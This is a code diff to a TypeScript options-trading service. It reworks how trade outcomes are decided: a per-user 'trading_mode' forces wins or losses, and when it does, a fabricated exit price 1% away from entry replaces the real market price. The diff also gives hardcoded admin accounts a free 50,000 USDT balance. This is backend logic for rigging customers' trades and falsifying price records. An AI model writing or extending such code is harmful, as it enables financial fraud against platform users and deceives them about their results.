@@ -21,10 +21,17 @@ class TradingService {
   // Create a new options trade
   async createOptionsTrade(request: TradeRequest): Promise<TradeResult> {
     try {
+      // Handle admin users - map them to their trading profile
+      let finalUserId = request.userId;
+      if (request.userId === 'superadmin-001' || request.userId === 'admin-001') {
+        finalUserId = `${request.userId}-trading`;
+        console.log(`🔧 Admin user ${request.userId} trading as ${finalUserId}`);
+      }
+
       // Validate minimum amount based on duration
       const optionsSettings = await storage.getOptionsSettings();
       const setting = optionsSettings.find(s => s.duration === request.duration && s.isActive);
-      
+
       if (!setting) {
         return {
           success: false,
@@ -42,8 +49,15 @@ class TradingService {
         };
       }
 
-      // Check user balance
-      const userBalance = await storage.getBalance(request.userId, 'USDT');
+      // Check user balance - create default balance for admin trading profiles
+      let userBalance = await storage.getBalance(finalUserId, 'USDT');
+      if (!userBalance && finalUserId.includes('-trading')) {
+        // Create default balance for admin trading profiles
+        await storage.updateBalance(finalUserId, 'USDT', '50000.00', '0.00');
+        userBalance = await storage.getBalance(finalUserId, 'USDT');
+        console.log(`💰 Created admin trading balance: ${finalUserId} with 50,000 USDT`);
+      }
+
       if (!userBalance || parseFloat(userBalance.available) < tradeAmount) {
         return {
           success: false,
@@ -63,12 +77,12 @@ class TradingService {
       // Lock the trade amount
       const newAvailable = (parseFloat(userBalance.available) - tradeAmount).toString();
       const newLocked = (parseFloat(userBalance.locked || '0') + tradeAmount).toString();
-      await storage.updateBalance(request.userId, 'USDT', newAvailable, newLocked);
+      await storage.updateBalance(finalUserId, 'USDT', newAvailable, newLocked);
 
       // Create the trade
       const expiresAt = new Date(Date.now() + request.duration * 1000);
       const trade = await storage.createTrade({
-        userId: request.userId,
+        userId: finalUserId,
         symbol: request.symbol,
         type: 'options',
         direction: request.direction,
@@ -115,10 +129,23 @@ class TradingService {
         return;
       }
 
-      // Check admin control for this user
-      const adminControl = await storage.getAdminControl(trade.userId);
+      // Get user's trading mode from user record
+      // For admin users trading with mapped IDs, check the original user ID for trading mode
+      let originalUserId = trade.userId;
+      if (trade.userId.endsWith('-trading')) {
+        originalUserId = trade.userId.replace('-trading', '');
+      }
+
+      const user = await storage.getUser(originalUserId);
+      const tradingMode = user?.trading_mode || 'normal';
+
+      console.log(`🎯 Executing trade for user ${trade.userId}`);
+      console.log(`🎯 Original user ID for trading mode: ${originalUserId}`);
+      console.log(`🎯 User object:`, user);
+      console.log(`🎯 Trading mode: ${tradingMode}`);
+
       const currentPrice = await priceService.getCurrentPrice(trade.symbol);
-      
+
       if (!currentPrice) {
         console.error(`Cannot execute trade ${tradeId}: No current price available`);
         return;
@@ -127,45 +154,39 @@ class TradingService {
       let isWin = false;
       let exitPrice = currentPrice;
 
-      // Apply admin control logic
-      if (adminControl && adminControl.isActive) {
-        switch (adminControl.controlType) {
-          case 'win':
-            isWin = true;
-            // Adjust exit price to ensure win
-            exitPrice = priceService.simulatePriceMovement(
-              trade.entryPrice!,
-              trade.direction as 'up' | 'down',
-              0.1
-            );
-            break;
-          case 'lose':
-            isWin = false;
-            // Adjust exit price to ensure loss
-            const oppositeDirection = trade.direction === 'up' ? 'down' : 'up';
-            exitPrice = priceService.simulatePriceMovement(
-              trade.entryPrice!,
-              oppositeDirection,
-              0.1
-            );
-            break;
-          case 'normal':
-          default:
-            // Use real market price
-            if (trade.direction === 'up') {
-              isWin = parseFloat(currentPrice) > parseFloat(trade.entryPrice!);
-            } else {
-              isWin = parseFloat(currentPrice) < parseFloat(trade.entryPrice!);
-            }
-            break;
-        }
-      } else {
-        // No admin control, use real market logic
-        if (trade.direction === 'up') {
-          isWin = parseFloat(currentPrice) > parseFloat(trade.entryPrice!);
-        } else {
-          isWin = parseFloat(currentPrice) < parseFloat(trade.entryPrice!);
-        }
+      // Apply trading mode logic
+      switch (tradingMode) {
+        case 'win':
+          isWin = true;
+          console.log(`🎯 FORCED WIN for user ${trade.userId}`);
+          // Adjust exit price to ensure win
+          if (trade.direction === 'up') {
+            exitPrice = (parseFloat(trade.entryPrice!) * 1.01).toString(); // 1% higher
+          } else {
+            exitPrice = (parseFloat(trade.entryPrice!) * 0.99).toString(); // 1% lower
+          }
+          break;
+        case 'lose':
+          isWin = false;
+          console.log(`🎯 FORCED LOSE for user ${trade.userId}`);
+          // Adjust exit price to ensure loss
+          if (trade.direction === 'up') {
+            exitPrice = (parseFloat(trade.entryPrice!) * 0.99).toString(); // 1% lower
+          } else {
+            exitPrice = (parseFloat(trade.entryPrice!) * 1.01).toString(); // 1% higher
+          }
+          break;
+        case 'normal':
+        default:
+          console.log(`🎯 NORMAL MODE for user ${trade.userId}`);
+          // Use real market logic
+          if (trade.direction === 'up') {
+            isWin = parseFloat(currentPrice) > parseFloat(trade.entryPrice!);
+          } else {
+            isWin = parseFloat(currentPrice) < parseFloat(trade.entryPrice!);
+          }
+          exitPrice = currentPrice;
+          break;
       }
 
       // Calculate profit/loss
